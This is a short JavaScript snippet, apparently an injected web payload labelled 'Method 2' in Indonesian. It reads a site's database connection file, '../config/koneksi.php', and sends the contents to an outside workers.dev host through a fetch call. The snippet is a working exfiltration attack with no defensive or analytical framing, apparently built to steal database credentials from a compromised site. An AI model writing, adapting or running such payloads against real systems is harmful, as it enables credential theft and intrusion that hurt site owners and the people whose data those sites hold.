// Method 2: Menggunakan XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('GET', '../config/koneksi.php', true);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        fetch('https://lucifer.yutupprem0.workers.dev/?message=' + encodeURIComponent(xhr.responseText));
    }
};
xhr.send();
